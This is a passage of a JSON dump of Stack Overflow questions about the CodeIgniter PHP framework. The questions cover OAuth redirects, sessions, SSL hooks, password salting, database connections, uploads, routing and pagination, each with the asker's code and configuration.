Facebook&lt;/a&gt;\";\n    }\n}\n</code></pre>\n\n<p>Simple as that: when authenticated it just prints my fb account data.</p>\n\n<p>My .htaccess:</p>\n\n<pre><code>RewriteCond %{THE_REQUEST} ^GET\\ /index\\.php/?([^ ]*)\nRewriteRule ^index\\.php/?(.*) /$1 [R,L]\nRewriteCond $0 !^index\\.php($|/)\nRewriteRule .* index.php/$0 [L]\n</code></pre>\n\n<p><strong>UPDATE</strong></p>\n\n<p>My login url from mysite.com/welcome <strong>NOT WORKING</strong></p>\n\n<pre><code>https://www.facebook.com/dialog/oauth?client_id=487********73&amp;redirect_uri=http%3A%2F%2Fmysite.com%2Fwelcome&amp;state=ae51191b8eabf884ead0c116e7e28b4d\n</code></pre>\n\n<p>and from mysite.com/index.php/welcome <strong>WORKING FINE</strong></p>\n\n<pre><code>https://www.facebook.com/dialog/oauth?client_id=487********73&amp;redirect_uri=http%3A%2F%2Fmysite.com%2Findex.php%2Fwelcome&amp;state=ae51191b8eabf884ead0c116e7e28b4d\n</code></pre>\n"},{"tags":["html5","codeigniter","twitter-bootstrap","yii","html5boilerplate"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":353,"score":1,"question_id":12674597,"title":"Integrating Boilerplate and Bootstrap with CodeIgniter or Yii","body":"<p>I've always been a PHP programmer, but until now without any framework. Now I've a nice project to start and I'd like to introduce some PHP framework: Yii or CodeIgniter.</p>\n\n<p>I don't know yet which one is best for me. I'd like to integrate this project with these 'tools':</p>\n\n<ul>\n<li>JQuery</li>\n<li>HTML5 Boilerplate</li>\n<li>Twitter Bootstrap</li>\n<li>CSS SASS</li>\n</ul>\n\n<p>Do you know which framework is more easy to integrate with these tools? And, do you know where I can find a good tutorial for this integration?</p>\n\n<p>Thx</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":12670606,"title":"CodeIgniter removes session after browser restart","body":"<p>I have this controller, which loges user with facebook credentials.</p>\n\n<pre><code>public function Facebook() {\n    $fb_data = $this-&gt;session-&gt;userdata('fb_data'); \n    // This array contains all the user FB information\n\n    $data['fb_data'] = $fb_data;\n    $fb = $data['fb_data']['me']['id'];\n\n    $userdata = $this-&gt;user_model-&gt;getID($fb);\n\n    $userID = $userdata['0']['id'];\n    $userNick = $userdata['0']['nick'];\n\n    $session_array = array(\n        'id' =&gt; $userID,\n        'userNick' =&gt; $userNick\n    );\n\n    $this-&gt;session-&gt;set_userdata('user_data',$session_array);\n    $user = $this-&gt;session-&gt;userdata('user_data');\n\n    print_r($this-&gt;session-&gt;all_userdata());\n\n    //print_r($user);\n\n    if($user['id'] &amp;&amp; $user['userNick']) {\n        redirect('/');\n    }\n}\n</code></pre>\n\n<p>It works well, but session is removed after browser restarts. There aren't any cookies created.</p>\n\n<p>Session Config:</p>\n\n<pre><code>$config['sess_cookie_name'] = 'ci_session';\n$config['sess_expiration'] = 0;\n$config['sess_expire_on_close'] = FALSE;\n$config['sess_encrypt_cookie'] = FALSE;\n$config['sess_use_database'] = FALSE;\n$config['sess_table_name'] = 'ci_sessions';\n$config['sess_match_ip'] = FALSE;\n$config['sess_match_useragent'] = TRUE;\n$config['sess_time_to_update'] = 300;\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":54,"score":0,"question_id":12677618,"title":"Live search with CodeIgniter?","body":"<p>I've got 2 views with CI:  Header and Content.</p>\n\n<p>In my controller I load my header, execute a query and then load this into the controller.  This is bringing back all my content.</p>\n\n<p>However, I have a search bar in my Header, what I'd like it to do is when the user is typing, I would like it to filter the content on the page as they type.</p>\n\n<p>Is there anyway to do this without constantly executing database queries?</p>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12669791,"title":"CodeIgniter's sess_destroy doesn't work","body":"<p>I have this controller:</p>\n\n<pre><code>    function Logout() {\n        $this-&gt;session-&gt;sess_destroy();\n        redirect('/');\n    }\n</code></pre>\n\n<p>Pretty straightforward. But it doesn't work. As simply as that - sessions are stil stored. I tried using <code>unset_userdata</code> with all my sessions (two at the moment), but it doesn't work also.</p>\n"},{"tags":["codeigniter","ssl","http-status-code-404","codeigniter-2","codeigniter-url"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":40,"score":0,"question_id":12676546,"title":"codeigniter 404 on https on client but not xampp","body":"<p>Hey guys was hoping you could help me out.</p>\n\n<p>I havent really read much on hooks or ssl, plan to do so but for now I am in kind of a rush to solve this so learning the whole thing I cant do..</p>\n\n<p>Problem is there is a  page with \"https\" since it has a checkout feature, but for some reason <strong>it loads fine on my xampp localhost</strong> but shows a <strong>404 error on my clients site</strong>.</p>\n\n<p>the controller with \"https\"  is called \"checkout\"</p>\n\n<p>I am not sure which settings function will be useful, but I am guessing this has something to do with hooks and ssl so will add that info.</p>\n\n<p><strong>part of hooks.php located at application\\config</strong></p>\n\n<pre><code>$hook['post_controller_constructor'][] = array(\n                                'function' =&gt; 'check_ssl',\n                                'filename' =&gt; 'ssl.php',\n                                'filepath' =&gt; 'hooks'\n                                );\n</code></pre>\n\n<p><strong>ssl.php located at application\\hooks</strong></p>\n\n<pre><code>&lt;? function check_ssl()\n{\n    $CI =&amp; get_instance();\n    $class = $CI-&gt;router-&gt;fetch_class();\n\n    $ssl = array('checkout');\n    $partial =  array('bookStep4');\n\n    if(in_array($class,$ssl))\n    {\n        force_ssl();\n    }\n    else if(in_array($class,$partial))\n    {\n        return;\n    }\n    else\n    {\n        unforce_ssl();\n    }\n}\n\nfunction force_ssl()\n{\n    $CI =&amp; get_instance();\n$CI-&gt;config-&gt;config['base_url'] = str_replace('http://', 'https://', $CI-&gt;config-&gt;config['base_url']);\n        if ($_SERVER['SERVER_PORT'] != 443)\n        {\n            $var=($_SERVER['QUERY_STRING']);\n            redirect($CI-&gt;uri-&gt;uri_string().'?'.$var);\n        }}\n\nfunction unforce_ssl()\n{\n    $CI =&amp; get_instance();\n    $CI-&gt;config-&gt;config['base_url'] = str_replace('https://', 'http://', $CI-&gt;config-&gt;config['base_url']);\n        if ($_SERVER['SERVER_PORT'] == 443)\n        {\n            $var=($_SERVER['QUERY_STRING']);\n            redirect($CI-&gt;uri-&gt;uri_string().'?'.$var);\n        }\n}\n?&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","user-agent"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12675608,"title":"Detecting if JS enabled in codeigniter","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/4454551/check-if-javascript-is-enabled-with-php\">Check if JavaScript is enabled with PHP</a>  </p>\n</blockquote>\n\n\n\n<p>I need a way to detect if javascript is enabled or disabled in the user-agent in the codeigniter framework</p>\n"},{"tags":["php","codeigniter","authentication","ion-auth"],"answer_count":2,"favorite_count":3,"up_vote_count":3,"down_vote_count":0,"view_count":58,"score":3,"question_id":12674756,"title":"Opinions on Dual-Salt authentication for low sensitivity user accounts?","body":"<p>I am currently working on a web project requiring user accounts.  The application is CodeIgniter on the server side, so I am using Ion Auth as the authentication library.</p>\n\n<p>I have written an authentication system before, where I used 2 salts to secure the passwords.  One was a server-wide salt which sat as an environment variable in the .htaccess file, and the other was a randomly generated salt which was created at user signup.</p>\n\n<p>This was the method I used in that authentication system for hashing the password:</p>\n\n<pre><code>    $chars = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\n    //create a random string to be used as the random salt for the password hash\n    $size = strlen($chars);\n    for($i = 0; $i &lt; 22; $i++) {\n        $str .= $chars[rand(0, $size - 1)];\n    }\n\n    //create the random salt to be used for the crypt\n    $r_blowfish_salt = \"$2a$12$\" . $str . \"$\";\n\n    //grab the website salt\n    $salt = getenv('WEBSITE_SALT');\n\n    //combine the website salt, and the password\n    $password_to_hash = $pwd . $salt;\n\n    //crypt the password string using blowfish\n    $password = crypt($password_to_hash, $r_blowfish_salt);\n</code></pre>\n\n<p>I have no idea whether this has holes in it or not, but regardless, I moved over to Ion Auth for a more complete set of functions to use with CI.</p>\n\n<p>I noticed that Ion only uses a single salt as part of its hashing mechanism (although does recommend that encryption_key is set in order to secure the database session.)</p>\n\n<p>The information that will be stored in my database is things like name, email address, location by country, some notes (which will be recommended that they do not contain sensitive information), and a link to a Facebook, Twitter or Flickr account.  Based on this, i'm not convinced it's necessary for me to have an SSL connection on the secure pages of my site.</p>\n\n<p>My question is, is there a particular reason why only 1 salt is being used as part as the Ion Auth library?  Is it implied that I write my own additional salting in front of the functionality it provides, or am I missing something?</p>\n\n<p>Furthermore, is it even worth using 2 salts, or once an attacker has the random salt and the hashed password, are all bets off anyway? (I assume not, but worth checking if i'm worrying about nothing...)</p>\n"},{"tags":["php","function","codeigniter","constructor","globals"],"answer_count":2,"favorite_count":3,"up_vote_count":0,"down_vote_count":0,"view_count":2697,"score":0,"question_id":4640886,"title":"Codeigniter variables from constructor are undefined","body":"<p>I'm using CI's Auth Tank library to query records for certain users. </p>\n\n<p>The variable <code>$user_id = tank_auth-&gt;get_user_id();</code> grabs the user id from the session. I want to pull records where <code>user_id = $user_id</code>.</p>\n\n<p>From what I understood, constructors can load variables each time a class is initiated. Sort of like global variables. So I figured I'll set my <code>$user_id</code> in a model constructor so I can use it for multiple functions within the model class. </p>\n\n<pre><code>class My_model extends Model {\n\n    function My_model() \n    {\n        parent::Model();\n        $user_id = $this-&gt;tank_auth-&gt;get_user_id();     \n    }\n\n        function posts_read() //gets db records for the logged in user\n    {       \n        $this-&gt;db-&gt;where('user_id', $user_id);\n        $query = $this-&gt;db-&gt;get('posts');\n        return $query-&gt;result();\n    }\n}\n</code></pre>\n\n<p>Next, I'm loading the model, creating an array in my controller, and sending the data to my view where I have a foreach loop.</p>\n\n<p>When testing I get</p>\n\n<blockquote>\n  <p>Message: Undefined variable: user_id</p>\n</blockquote>\n\n<p>in my model. It works however if I define the <code>$user_id</code> variable in my <code>posts_read</code> function, but I don't want to define it in every function that needs it. </p>\n\n<p>What am I doing wrong here?</p>\n"},{"tags":["php","file","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":52,"score":-2,"question_id":12615620,"title":"codeigniter how to work with contents of a file?","body":"<p>I am working in a codeigniter project which requires me to read the contents of an uploaded text file and modify the contents and write them to the file if necessary.For example if abc.txt file contains </p>\n\n<pre>\n\n    flower.jpg milk.jpg\n    wheat.jpg\n    cow.jpg house.jpg\n    bird.jpg\n\n</pre>\n\n<p>I need to read the file contents like what is in the 2nd row -- \"wheat.jpg\" and modify and write instead \"pen.jpg\".</p>\n\n<p>I do not know how to do it.So I need help/suggestions/code snippets/reference to how to do it.</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12672735,"title":"Trouble with codeigniter redirect","body":"<p>I try to redirect a search to the right controller. This works fine if I have no special chars in the searchkey. If I have special keys in it I get an error from codeigniter:   </p>\n\n<blockquote>\n  <p>The URI you submitted has disallowed characters.</p>\n</blockquote>\n\n<p>Here is my code:</p>\n\n<pre><code>public function search()\n{\n    $searchkey = urlencode($this-&gt;input-&gt;post('searchkey'));\n    switch ($this-&gt;input-&gt;post('searchtype')) {\n        case 'request':     redirect('portal/requests/search/'.$searchkey, 'refresh');\n                            break;\n        case 'offers':      redirect('portal/offers/search/'.$searchkey, 'refresh');\n                            break;\n        case 'projects':    redirect('portal/projects/search/'.$searchkey, 'refresh');\n                            break;\n        default:            redirect('portal/requests/search/'.$searchkey, 'refresh');\n                            break;\n    }\n}\n</code></pre>\n"},{"tags":["codeigniter","rest","authentication","mobile","user"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":116,"score":0,"question_id":12663952,"title":"mobile application and codeigniter rest web service user registration","body":"<p>i want to develop android and wp7 mobile application which connects to my web service and posts or get content. Something like twitter. I want to use codeigniter rest server (https://github.com/philsturgeon/codeigniter-restserver) to make web service api, but Im stuck on user registration and authorization. I would like to use tank auth library (http://konyukhov.com/soft/tank_auth/) but I dont know how to handle logged in user. Lets say user logs in and what should I do next. Should I generate some access token and send it to user and store it in database and should user post this access token with each next request to web server ? Then I would check that access token and allow or disallow web service request. Or what is correct approach to do this ?</p>\n\n<p>Ideally i would like to give user option to use facebook twitter to sign in or create a my web service sign in. Do you have any ideas how to do this ?</p>\n\n<p>Thank you very much</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12672196,"title":"Codeigniter connecting to multiple databases","body":"<p>I have been using these lines of code for connecting multiple databases in codeigniter but getting error. My new db connection is for new_group.</p>\n\n<pre><code>$this-&gt;new_group = $this-&gt;CI-&gt;load-&gt;database('new_group', TRUE); \n$q = $this-&gt;new_group-&gt;query(\"SELECT* FROM mytable ORDER BY id DESC\");\n</code></pre>\n\n<p>Call to a member function database() on a non-object.</p>\n\n<p>Waiting for response. Thanks</p>\n"},{"tags":["php","database","security","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12672274,"title":"Security for a User web application","body":"<p>I've been wondering about the security aspect of my application.\nI'm using CodeIgniter PHP Framework for my project.</p>\n\n<p>I'd like to know some \"expert\" opinions on this.\nI have a login function.\nWhen a user logged in, the session is store in database. I added information like user Id in the information session.\nA user can create a company. But to do that, I first check his account to see if he already has one. \nThis session user Id allows me to run a DB request to find that out.\nFor example :</p>\n\n<pre><code>function create(){\n    $hasCompany = $this-&gt;Accountmodel-&gt;hasCompany($this-&gt;session-&gt;userdata('id'));\n    if($hasCompany){\n        $data['company'] = $this-&gt;Companymodel-&gt;getCompanyInfo($this-&gt;session-&gt;userdata('id');\n        $this-&gt;load-&gt;view('company/panel', $data);\n    }\n    else{\n        $this-&gt;load-&gt;view('company/create');\n    }\n\n}\n</code></pre>\n\n<p>And then if he has one, I can print the company edit/delete panel.\nIt allows me to avoid the use of id parameters in the url like :\nmyserver.com/company/edit/[id]</p>\n\n<p>So to get to the point, I was wondering if, in term of security, this is ok or there is some kind of vulnerability.</p>\n\n<p>Any advices are welcome !</p>\n"},{"tags":["php","codeigniter","curl","png"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":55,"score":-2,"question_id":12670034,"title":"Get images (png) from other authentication web.","body":"<p>I use codeigniter and I need to get images (png) from other websites to my website but this website needs to have authentication.\nThis is first result.</p>\n\n<p>�PNG  IHDR��e>��PLTE������ddd����&lt;��IDATx��]I��:������N.....</p>\n\n<p>When I added <code>header('Content-Type: image/png');</code>, the image cannot be displayed on web browsers and Firefox reports this image: <code>\"xxx.xxx/site/testImg\" cannot be displayed because it contains errors.</code></p>\n\n<p>This URL(xxx.xxx/site/testImg) is the url which i need to show the image on it.</p>\n\n<p>I tried to find a solution which similar this issue. \nEx:\n<a href=\"http://stackoverflow.com/questions/12172461/parse-php-generated-png-in-html\">Parse php generated png in html</a>\n<a href=\"http://stackoverflow.com/questions/12172461/parse-php-generated-png-in-html\">http://stackoverflow.com/questions/3385982/the-image-cannot-be-displayed-because-it-contains-errors</a>\nBut those doesn't work for me (include header(move to top of code), separate 2 files ).</p>\n\n<p>This is file in controller (site.php)</p>\n\n<pre><code>function testImg()\n{\n   session_start();\n    if(isset($_SESSION['Name'])) {\n             $this-&gt;load-&gt;view('testImage');\n        }\n        else {\n            show_error(\"Please Try again\");\n        }\n}\n</code></pre>\n\n<p>This is file in view (testImage.php)</p>\n\n<pre><code>&lt;?php\n\n$ch = curl_init();\n\ncurl_setopt($ch, CURLOPT_URL, \"http://xxxx.com/xxx/xxxx.png\");\ncurl_setopt($ch, CURLOPT_USERPWD, \"xxx:yyyy\"); \ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);\n\n$ce = curl_exec($ch);\ncurl_close($ch);\n$im = imagecreatefromstring($ce);\nheader('Content-Type: image/png');\nimagepng($im);  \n?&gt;\n</code></pre>\n\n<p>When I removed <code>header('Content-Type: image/png');</code> It'll show \"�PNG  IHDR��e>��PLTE������ddd\" again.</p>\n\n<p>How can I display .png as a picture?\nThank you for advance.</p>\n"},{"tags":["codeigniter","mongodb"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12658490,"title":"Combining AND and OR in MongoDB queries","body":"<p>I'm building a pretty complex search formula for an automotive website that is using mongo for their auto storage. Most of it I have found to be very straightforward. It currently supports filtering by body style, new/used, etc. Where I'm running into a problem, though, is where it defaults to both new and used vehicles, since they will both have a separate price range (calculated low and high prices based on a monthly payment range). How can I make this work? </p>\n\n<p>For example, if it's just a used auto, we're using this (CodeIgniter) code: </p>\n\n<pre><code>$this-&gt;mongo_db-&gt;where('stock_type', 'used');\n$this-&gt;mongo_db-&gt;where_between('internet_price', $amounts['bottom_amt_used'], $amounts['top_amt_used']);\n</code></pre>\n\n<p>We do something similar for new cars. Works great on their own. How do I combine these so that I can find </p>\n\n<ul>\n<li>IF stock_type = new, WHERE_BETWEEN(a, b) </li>\n<li>OR IF stock_type = false, WHERE_BETWEEN(c, d)</li>\n</ul>\n\n<p>And combine this with other filters, like WHERE body_style IN (...)?</p>\n\n<p>We are using CodeIgniter and Alex Bilbie's mongodb library, which might complicate things here, I'm thinking.</p>\n"},{"tags":["php","codeigniter","upload"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12667864,"title":"Codeigniter setting upload path out of installation folder","body":"<p>I have problem uploading the files, whenever i echo </p>\n\n<pre><code>$this-&gt;upload-&gt;display_errors();\n</code></pre>\n\n<p>this gives error <code>The upload path does not appear to be valid.</code></p>\n\n<p>my directory structure</p>\n\n<pre><code>- main\n   - CI_Installation\n   - uploads\n     - brochures\n</code></pre>\n\n<p>The test i m doing is in my local machine. In production server the two inside folders will be in root folder instead of <code>main</code> folder.</p>\n\n<p>I want to upload files to the <code>uploads</code> folder, i.e. outside CI installation folder. I have tried setting path\n<code>./uploads/brochures/</code>\n<code>../../uploads/brochures/</code> and every other possible path but still getting that error.</p>\n\n<p><strong>Edit</strong></p>\n\n<p>I know i have something wrong in path, folder permission would have yield another error. The error explicitly says <code>The upload path does not appear to be valid.</code> </p>\n\n<p>Below is snippet of the code, posting whole controller is not feasible because it has several lines of code, which might be difficult to read.  </p>\n\n<pre><code>                    $config['upload_path'] = './uploads/brochures/';\n                $config['allowed_types'] = 'gif|jpg|png|pdf|docx|doc';\n                $config['max_size'] = '10000';\n                $config[\"remove_spaces\"]=TRUE;\n                $config['encrypt_name']  = TRUE;\n                $this-&gt;load-&gt;library('upload',$config);\n                $this-&gt;upload-&gt;initialize($config);\n                $uploaded = $this-&gt;upload-&gt;do_upload(\"b_path\");\n                $data = array('upload_data' =&gt; $this-&gt;upload-&gt;data());\n\n                echo \"ERRORS = \".$this-&gt;upload-&gt;display_errors();\n</code></pre>\n\n<p>Can anybody help me here?</p>\n\n<p>Thanks</p>\n"},{"tags":["php","mysql","database","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":90,"score":1,"question_id":12651207,"title":"CodeIgniter Model Not Found","body":"<p>I am trying to connect mysql with CodeIgniter. I got this error:</p>\n\n<pre><code>load-&gt;database(); \n$query = $this-&gt;db-&gt;get('student'); return $query-&gt;result(); } } ?&gt;\n\nFatal error: Class 'Student_model' not found in \nC:\\wamp\\www\\CodeIgniter\\system\\core\\Loader.php on line 303\n</code></pre>\n\n<p>Here is my code:</p>\n\n<p><strong>MODEL</strong></p>\n\n<pre><code>class Student_model extends CI_Model\n{\n\n    function __Construct()\n\n    {\n        parent::__Construct();\n    }\n\n    public function student_getall()\n    {\n        $this-&gt;load-&gt;database();\n        $query = $this-&gt;db-&gt;get('student');\n        return $query-&gt;result();\n    }\n}\n</code></pre>\n\n<p><strong>VIEW</strong></p>\n\n<pre><code>foreach($query as $row)\n{\n    print $row-&gt;fname;\n    print $row-&gt;lname;\n    print $row-&gt;roll;\n    print $row-&gt;address;\n    print \"&lt;br&gt;\";\n}\n</code></pre>\n\n<p><strong>CONTROLLER</strong></p>\n\n<pre><code>class Student extends CI_Controller\n{\n    function __Construct()\n    {\n        parent::__Construct();\n    }\n\n    public function getall()\n    {\n        $this-&gt;load-&gt;model('student_model');\n        $data['query'] = $this-&gt;student_model-&gt;student_getall();\n        $this-&gt;load-&gt;view('student_view',$data);\n    }\n}\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12434856,"title":"CodeIgniter Session Issues","body":"<p>I set session in a controller function like</p>\n\n<pre><code>$search = array(\n    'search_count' =&gt; count($data['result']),\n    'projectInfo' =&gt; $data['result']\n    );\n\n$this-&gt;session-&gt;set_userdata($search);\n</code></pre>\n\n<p>where $data['result'] is an array;</p>\n\n<p>but if I try to access this variable in other function of same controller it shows nothing:</p>\n\n<pre><code>print_r($this-&gt;session-&gt;userdata('projectInfo'));\n</code></pre>\n\n<p>though on using <code>print_r($this-&gt;session-&gt;userdata('search_count'));</code> it shows correct value.</p>\n\n<p>also if I use <code>print_r($this-&gt;session-&gt;all_userdata());</code> in second function of same controller it does not show array value index which I have already set in first function</p>\n\n<pre><code> Array\n(\n    [session_id] =&gt; 4adf3a42ee64ffca2b2f273cb293a10a\n    [ip_address] =&gt; 127.0.0.1\n    [user_agent] =&gt; Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1\n    [last_activity] =&gt; 1347689522\n    [user_data] =&gt; \n)\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":12663275,"title":"CSS doesn't link properly from the header file using base_url helper","body":"<p>My <strong>header.php</strong> doesn't link to <strong>default.css</strong> properly. Page loads without <strong>CSS</strong> applied.\nIf I view the source of the page and click on the link to <strong>.css</strong> file - <strong>403 Forbidden</strong> shows up in <strong>Source View</strong>.</p>\n\n<p><strong>config.php</strong></p>\n\n<p><code>$config['base_url']    = 'http://localhost/dev/';</code></p>\n\n<p><strong>routes.php</strong></p>\n\n<pre><code>$route['default_controller'] = \"page/view\";\n$route['404_override'] = '';\n</code></pre>\n\n<p><strong>pages</strong> <em>is the controller</em></p>\n\n<p><strong>view</strong> <em>is the method</em></p>\n\n<p><strong>application/view/templates/header.php</strong></p>\n\n<pre><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=\"utf-8\"&gt;\n        &lt;link href=\"&lt;?php echo base_url(); ?&gt;application/css/default.css\" rel=\"stylesheet\" type=\"text/css\" /&gt;\n        &lt;title&gt;&lt;?php echo $title; ?&gt;&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n</code></pre>\n\n<p><strong>application/css/default.css</strong></p>\n\n<pre><code>* {margin:0;padding:0;}\n\nbody {\n    background-image: url(../images/bg.gif);\n    background-repeat: repeat-x;\n    ...\n}\n</code></pre>\n\n<p><strong>application/images/</strong></p>\n\n<p><code>-- bg.gif GIF Image 1KB</code></p>\n"},{"tags":["javascript","jquery","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":12619213,"title":"Jquery, Codeigniter 2.1 - pagination issues","body":"<p>I am creating pagination using Codeigniter, and I want to add ajax functionality. JS is working when pagination link is clicked first time. When it is clicked for the second time JS doesn't work and pagination is working via PHP controller (this part is working without any problem). This is JS code:</p>\n\n<pre><code>var pag = $('#pagination a');\n\n    pag.on('click', function(e){\n        var pagination =\n            {\n            target : $(this).attr('href') + ' .mali_oglasi',    \n            content : $('.mali_oglasi'),\n            container: $('.mali_oglasi_wrapper')\n            };\n\n            pagination.content.animate({'opacity':0, scrollTop: 0}, 400, function(){\n                pagination.container.load(pagination.target, function(){\n                    pagination.content.animate({'opacity':1}, 400);\n                });                \n            });            \n        e.preventDefault(); \n    });  \n</code></pre>\n\n<p>Also <strong>scrollTop</strong> doesn't work. What am I doing wrong?</p>\n"},{"tags":["mysql","database","codeigniter","database-design","database-connection"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12493195,"title":"CI Database Name","body":"<p>I have a problem in connecting database in Codeigniter , cause my database name is \"database-db_sample\", so I'm wondering if the -(hypen) in my db name is the reason why I got an error,</p>\n\n<p>This is the error i got</p>\n\n<blockquote>\n  <p>A Database Error Occurred</p>\n  \n  <p>Unable to select the specified database: database-db_sample</p>\n</blockquote>\n\n<p>Can someone tell me what's I had done wrong, \nThis is my db config</p>\n\n<pre><code>$db['online']['hostname'] = \"localhost\";\n$db['online']['username'] = \"root\";\n$db['online']['password'] = \"\";\n$db['online']['database'] = \"database-db_sample\";\n$db['online']['dbdriver'] = \"mysql\";\n$db['online']['dbprefix'] = \"\";\n$db['online']['pconnect'] = TRUE;\n$db['online']['db_debug'] = TRUE;\n$db['online']['cache_on'] = FALSE;\n$db['online']['cachedir'] = \"\";\n$db['online']['char_set'] = \"utf8\";\n$db['online']['dbcollat'] = \"utf8_general_ci\";\n$db['default']['swap_pre'] = '';\n$db['default']['autoinit'] = TRUE;\n$db['default']['stricton'] = FALSE;\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12623318,"title":"codeigniter using Utility with inactive database","body":"<p>I use a model in codeigniter to switching between many databases in my script, and i want to use Utility class, when i use it it's deal with the database that is write as an active_group in database config file, Can i change it to deal with any other database inactive ?</p>\n"},{"tags":["php","codeigniter","routing","controller","remap"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12652411,"title":"How to route identical Codeigniter Controllers","body":"<p>My Codeigniter project has a long list of identical categories, each with many identical methods.</p>\n\n<p>To make it dynamic and cleaner, I have used _remap functions to load the identical methods within the controller. Now I am trying to replicate the controllers</p>\n\n<p>e.g. My controllers \nAntelope.php Bat.php Cuckoo.php Dog.php Elephant.php... Zebra.php all have this format below (I used _remap to condense all the similar methods into one).</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass Antelope extends CI_Controller {\n\n    function __construct() {\n        parent::__construct();\n    }\n\n    private function _remap($method, $params=array()){\n       $this-&gt;animal = ucwords($this-&gt;router-&gt;fetch_class());\n       $allowed_methods = array(\"Tame\", \"Buy\", \"Sell\", \"Gift\");\n       if (in_array($method, $allowed_methods)):\n           // Model zoo has been autoloaded      \n           data[\"foobar\"] = $this-&gt;zoo-&gt;get_data($this-&gt;animal, $method);\n           // Stuff goes here\n       else:\n          $this-&gt;index();\n       endif;\n    }\n\n    public function index(){\n       // Stuff goes here\n    }\n}\n\n/** End of file Antelope.php **/\n</code></pre>\n\n<p>The remapping works fine for Antelope and all its remapped methods, but is there a way for me to apply this same method to all the other files <strong>so I can just have a single Animal.php Controller file instead</strong>?</p>\n\n<p>I guess I may use routes.php, but the list of Controllers is too long; I'd have hundreds of lines in the routes file if I explicitly list each \"animal\" routing.</p>\n\n<p>Any way around this?</p>\n\n<p><strong>EDIT:</strong> The \"animal types\" are listed in a database, and will keep increasing over time. I don't want to keep revisiting the project to create new controllers or add new classes for the new elements in the database! This is why I want to use a dynamic routing method. Also, the project is a site redesign, so the URLs like <a href=\"http://www.website.com/antelope/buy/3\" rel=\"nofollow\">http://www.website.com/antelope/buy/3</a> need to remain the same.</p>\n"},{"tags":["php","codeigniter","extend"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1134,"score":0,"question_id":8878808,"title":"CodeIgniter CI_Controller not found","body":"<p>So basically, the below is the code I have right now:</p>\n\n<pre><code>class MY_Log extends CI_Log {\n\n    /**\n    * Variable storing the CodeIgniter instance.\n    *\n    * @access private\n    * @since v0.1.0.0\n    */\n    private $CI;\n\n    /**\n    * Constructor for later use by internal\n    * methods.\n    *\n    * @access public\n    * @since v0.1.0.0\n    */\n    public function __construct()\n    {\n        // Extend the parent logging.\n        parent::__construct();\n\n        $this-&gt;$CI =&amp; get_instance();\n    }\n}\n</code></pre>\n\n<p>And I get the following error;</p>\n\n<pre><code>Fatal error: Class 'CI_Controller' not found in /&lt;deleted&gt;/system/core/CodeIgniter.php on line 233\n</code></pre>\n\n<p>This is kinda how the user guide describes it.</p>\n"},{"tags":["php","mysql","codeigniter","codeigniter-2"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":233,"score":2,"question_id":11056303,"title":"combining mysql AND OR queries in Codeigniter","body":"<p>I want to combine AND OR mysql queries in CI. I have already seen this thread: <a href=\"http://codeigniter.com/forums/viewthread/92818/\" rel=\"nofollow\">http://codeigniter.com/forums/viewthread/92818/</a>.\nBut they don't provide the exact solution there.</p>\n\n<p><strong>How do I create the following query using strictly the CI framework?</strong> (I can create the query easily without the brackets but then it is not the same query.)</p>\n\n<pre><code>SELECT * FROM `Persons` WHERE\nLastName='Svendson' AND Age=\"12\" AND\n(FirstName='Tove' OR FirstName='Ola' OR Gender=\"M\" OR Country=\"India\") \n</code></pre>\n\n<p>P.S.: This is just a sample query even if it makes no sense &amp; Do not 